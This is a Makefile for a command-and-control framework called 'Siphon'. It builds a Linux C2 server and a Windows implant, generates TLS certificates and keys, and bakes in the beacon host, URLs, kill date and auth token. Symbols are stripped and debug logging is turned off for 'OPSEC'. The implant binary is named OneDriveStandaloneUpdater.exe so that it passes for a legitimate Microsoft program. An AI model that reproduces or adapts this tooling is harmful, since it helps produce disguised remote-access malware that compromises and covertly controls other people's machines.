# Siphon C2 Framework — Build System
# Usage:
#   make setup       — generate TLS certs and ECDH keypair
#   make server      — build the C2 server (Linux)
#   make implant     — build the implant (Windows amd64)
#   make all         — build both
#   make clean       — remove build artifacts

# Implant build-time config (override via make implant C2_HOST=... etc.)
C2_HOST    ?= https://127.0.0.1:443
SLEEP_SEC  ?= 5
SERVER_PK  ?=
USER_AGENT ?=
BEACON_URL ?=
SUBMIT_URL ?=
KILL_DATE  ?=
AUTH_TOKEN ?=

# Output directories
BUILD_DIR  := build
CERT_DIR   := server/certs

# Go build flags
# Set DEBUG=true to enable implant debug logging (off by default for OPSEC)
DEBUG      ?=

LDFLAGS_IMPLANT := -s -w \
	-X 'main.c2Host=$(C2_HOST)' \
	-X 'main.sleepSec=$(SLEEP_SEC)' \
	-X 'main.serverPK=$(SERVER_PK)' \
	-X 'main.debugMode=$(DEBUG)'

# Optional ldflags — only included when the variable is set, to preserve defaults.
ifneq ($(USER_AGENT),)
LDFLAGS_IMPLANT += -X 'main.userAgentOverride=$(USER_AGENT)'
endif
ifneq ($(BEACON_URL),)
LDFLAGS_IMPLANT += -X 'main.beaconURL=$(BEACON_URL)'
endif
ifneq ($(SUBMIT_URL),)
LDFLAGS_IMPLANT += -X 'main.submitURL=$(SUBMIT_URL)'
endif
ifneq ($(KILL_DATE),)
LDFLAGS_IMPLANT += -X 'main.killDate=$(KILL_DATE)'
endif
ifneq ($(AUTH_TOKEN),)
LDFLAGS_IMPLANT += -X 'main.authToken=$(AUTH_TOKEN)'
endif

.PHONY: all server implant setup clean

all: server implant

server:
	@mkdir -p $(BUILD_DIR)
	@echo "[*] Building C2 server (linux/amd64)..."
	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
		go build -trimpath -ldflags "-s -w" -o $(BUILD_DIR)/siphon-server ./server/cmd/
	@echo "[+] Server binary: $(BUILD_DIR)/siphon-server"

implant:
	@mkdir -p $(BUILD_DIR)
ifndef SERVER_PK
	@echo "[-] SERVER_PK not set. Run 'make setup' first, then:"
	@echo "    make implant SERVER_PK=<hex pubkey from setup>"
	@exit 1
endif
	@echo "[*] Building implant (windows/amd64)..."
	CGO_ENABLED=0 GOOS=windows GOARCH=amd64 \
		go build -trimpath -ldflags "$(LDFLAGS_IMPLANT)" \
		-o $(BUILD_DIR)/OneDriveStandaloneUpdater.exe ./implant/
	@echo "[+] Implant binary: $(BUILD_DIR)/OneDriveStandaloneUpdater.exe"

implant-linux:
	@mkdir -p $(BUILD_DIR)
ifndef SERVER_PK
	@echo "[-] SERVER_PK not set."
	@exit 1
endif
	@echo "[*] Building implant (linux/amd64) for testing..."
	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
		go build -trimpath -ldflags "$(LDFLAGS_IMPLANT)" \
		-o $(BUILD_DIR)/implant-linux ./implant/
	@echo "[+] Implant binary: $(BUILD_DIR)/implant-linux"

setup:
	@mkdir -p $(CERT_DIR) $(BUILD_DIR)
	@echo "[*] Building server temporarily for key generation..."
	@go build -trimpath -ldflags "-s -w" -o $(BUILD_DIR)/siphon-server ./server/cmd/
	@echo "[*] Generating ECDH server keypair..."
	@$(BUILD_DIR)/siphon-server -genkey -serverkey $(CERT_DIR)/server.pem
	@echo ""
	@echo "[*] Generating self-signed TLS certificate..."
	@$(BUILD_DIR)/siphon-server -gencert -cert $(CERT_DIR)/server.crt -key $(CERT_DIR)/server.key
	@echo ""
	@echo "[+] Setup complete. Now build the implant with the public key above:"
	@echo "    make implant SERVER_PK=<paste hex pubkey here>"

clean:
	rm -rf $(BUILD_DIR)
	rm -f $(CERT_DIR)/server.pem $(CERT_DIR)/server.crt $(CERT_DIR)/server.key
